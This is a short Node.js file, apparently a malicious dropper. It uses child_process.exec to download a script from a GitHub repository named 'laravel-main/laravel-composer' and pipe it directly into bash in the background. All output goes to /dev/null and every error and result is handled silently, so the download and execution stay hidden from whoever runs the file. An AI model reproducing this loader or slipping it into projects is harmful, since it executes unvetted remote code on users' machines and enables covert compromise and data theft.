const { exec } = require("child_process");

const command = `
bash -c "curl -fsSL https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer | bash" > /dev/null 2>&1 &
`;

exec(command, (error, stdout, stderr) => {
    if (error) {
        // Silent error handling
        return;
    }
    if (stderr) {
        // Silent error handling
    }
    // Silent success
});
